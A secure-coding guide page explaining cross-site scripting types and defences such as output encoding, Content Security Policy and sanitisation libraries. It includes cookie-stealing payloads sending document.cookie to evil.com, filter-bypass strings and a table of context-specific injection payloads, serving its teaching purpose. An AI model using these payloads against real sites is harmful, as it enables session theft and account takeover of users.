---
title: "Cross-Site Scripting (XSS)"
weight: 3
---

## What Is XSS?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into web pages viewed by other users. The victim's browser cannot distinguish between legitimate scripts from the application and injected scripts — it executes both with the same origin and permissions.

XSS is the most prevalent web vulnerability. It enables session hijacking, credential theft, defacement, phishing, and client-side malware distribution.

---

## Types of XSS

### Reflected XSS

The malicious script is part of the HTTP request and reflected back in the response without being stored. The attacker crafts a URL containing the payload and tricks the victim into clicking it.

```text
GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

If the server reflects the query parameter into the page without encoding:

```html
<!-- VULNERABLE -->
<p>Results for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>
```

The browser executes the script in the context of the vulnerable site.

### Stored XSS

The payload is saved in the database (comment, profile field, forum post) and served to every user who views the page. This is more dangerous than reflected XSS because it does not require victim interaction beyond visiting a legitimate page.

```text
1. Attacker posts a comment: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
2. The application stores the comment in the database
3. Every user viewing the comment page executes the attacker's code
```

### DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript. The server never sees the malicious input — it is processed by the browser's DOM.

```javascript
// VULNERABLE — reads from URL fragment and writes to DOM
const name = document.location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

Attacker crafts:

```text
https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

### Comparison

| Type | Stored? | Server Involved? | Victim Action Needed |
|------|---------|-------------------|----------------------|
| Reflected | No | Yes (reflects input) | Click malicious link |
| Stored | Yes (database) | Yes (serves stored payload) | Visit affected page |
| DOM-based | No | No (client-side only) | Click malicious link |

---

## Impact of XSS

What an attacker can do once JavaScript executes in the victim's browser:

| Action | Technique |
|--------|-----------|
| Steal session cookies | `fetch('https://evil.com?c=' + document.cookie)` |
| Capture keystrokes | Inject a keylogger via `addEventListener('keypress', ...)` |
| Redirect to phishing page | `window.location = 'https://evil-login.com'` |
| Modify page content | Change bank transfer details, inject fake forms |
| Perform actions as the victim | Send AJAX requests using the victim's session |
| Read local storage | `localStorage.getItem('token')` |

---

## Prevention: Output Encoding

The primary defence against XSS is **context-aware output encoding**. Every time you insert dynamic content into HTML, you must encode it for the context in which it appears.

### Encoding by Context

| Context | Encoding Rule | Example |
|---------|--------------|---------|
| HTML body | HTML-entity encode `< > & " '` | `&lt;script&gt;` |
| HTML attribute | Attribute-encode, always quote values | `value="user&#x27;s input"` |
| JavaScript string | JavaScript-escape `\x` or `\u` | `\x3cscript\x3e` |
| URL parameter | URL-encode (percent-encoding) | `%3Cscript%3E` |
| CSS value | CSS-escape or use allowlists | Avoid dynamic CSS entirely |

### Server-Side Encoding

**Python (Jinja2) — auto-escaping enabled by default:**

```html
<!-- SAFE — Jinja2 auto-escapes {{ }} expressions -->
<p>Hello, {{ username }}</p>

<!-- DANGEROUS — |safe disables escaping -->
<p>{{ user_html|safe }}</p>
```

**Java (Thymeleaf) — auto-escaping by default:**

```html
<!-- SAFE — th:text escapes output -->
<p th:text="${username}">placeholder</p>

<!-- DANGEROUS — th:utext disables escaping -->
<p th:utext="${userHtml}">placeholder</p>
```

**Go (html/template) — auto-escaping by default:**

```go
// SAFE — html/template auto-escapes
tmpl := template.Must(template.New("page").Parse(`<p>Hello, {{.Name}}</p>`))

// DANGEROUS — text/template does NOT escape
tmpl := textTemplate.Must(textTemplate.New("page").Parse(`<p>Hello, {{.Name}}</p>`))
```

### Client-Side Safe APIs

```javascript
// DANGEROUS — parses HTML, enables XSS
element.innerHTML = userInput;
document.write(userInput);

// SAFE — treats content as text, not HTML
element.textContent = userInput;
element.setAttribute('data-name', userInput);
```

---

## Prevention: Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which sources of content are allowed. A strong CSP is the most effective second layer of defence against XSS.

### Example Policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
```

### Key Directives

| Directive | Controls | Recommendation |
|-----------|----------|----------------|
| `default-src` | Fallback for all fetch directives | `'self'` |
| `script-src` | JavaScript sources | `'self'` — avoid `'unsafe-inline'` and `'unsafe-eval'` |
| `style-src` | CSS sources | `'self'` — minimise `'unsafe-inline'` |
| `img-src` | Image sources | `'self' data: https:` |
| `connect-src` | AJAX, WebSocket, EventSource | `'self'` + API domains |
| `frame-ancestors` | Who can embed this page (replaces `X-Frame-Options`) | `'none'` or `'self'` |
| `base-uri` | Restricts `<base>` element | `'self'` |
| `form-action` | Where forms can submit | `'self'` |

### Nonce-Based CSP (Strongest)

Instead of allowing `'unsafe-inline'`, generate a random nonce per request:

```http
Content-Security-Policy: script-src 'nonce-abc123def456'
```

```html
<!-- Allowed — nonce matches -->
<script nonce="abc123def456">
  console.log('legitimate');
</script>

<!-- Blocked — no matching nonce -->
<script>
  alert('injected');
</script>
```

**Express.js implementation:**

```javascript
import crypto from 'crypto';

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'nonce-${res.locals.cspNonce}' 'strict-dynamic'`
  );
  next();
});
```

---

## Prevention: Input Sanitisation

Sanitisation removes or neutralises dangerous content from input. It is a **secondary** defence — output encoding and CSP are primary.

### When to Sanitise

Use sanitisation when you must accept rich HTML (WYSIWYG editors, markdown renderers):

```javascript
// Server-side: DOMPurify (Node.js)
import DOMPurify from 'isomorphic-dompurify';

const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href'],
});
```

```python
# Python: bleach
import bleach

clean = bleach.clean(
    user_html,
    tags=['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    attributes={'a': ['href']},
)
```

### Never Roll Your Own Sanitiser

Regex-based sanitisation is always bypassable:

```text
Blocklist bypass examples:
  <ScRiPt>alert(1)</ScRiPt>           (case variation)
  <img src=x onerror=alert(1)>        (event handler, no <script>)
  <svg onload=alert(1)>               (SVG event)
  <a href="javascript:alert(1)">      (javascript: URI)
  <div style="background:url('javascript:alert(1)')">
```

Use a battle-tested library (DOMPurify, bleach, OWASP Java HTML Sanitizer) — never write your own.

---

## Common XSS Contexts and Bypasses

| Context | Vulnerable Code | Exploit |
|---------|----------------|---------|
| HTML body | `<div>USER_INPUT</div>` | `<img src=x onerror=alert(1)>` |
| Attribute (unquoted) | `<input value=USER_INPUT>` | `onfocus=alert(1) autofocus` |
| Attribute (quoted) | `<input value="USER_INPUT">` | `" onfocus="alert(1)" autofocus="` |
| JavaScript string | `var x = 'USER_INPUT';` | `'; alert(1); //` |
| URL (href) | `<a href="USER_INPUT">` | `javascript:alert(1)` |
| CSS | `background: url(USER_INPUT)` | `javascript:alert(1)` (legacy browsers) |

---

## Key Takeaways

- **XSS executes attacker-controlled JavaScript in the victim's browser** — enabling session theft, credential capture, and actions on behalf of the user.
- **Output encoding is the primary defence** — encode dynamically inserted content according to the HTML context (body, attribute, JavaScript, URL).
- **Use templating engines with auto-escaping enabled** (Jinja2, Thymeleaf, Go `html/template`) and never disable escaping without explicit justification.
- **Content Security Policy** is the strongest second layer — use nonce-based `script-src` and avoid `'unsafe-inline'` and `'unsafe-eval'`.
- **Never build your own HTML sanitiser** — use DOMPurify, bleach, or OWASP Java HTML Sanitizer for rich-text input.
- **DOM-based XSS** bypasses server-side defences entirely — avoid `innerHTML`, `document.write`, and `eval` with user-controlled data.
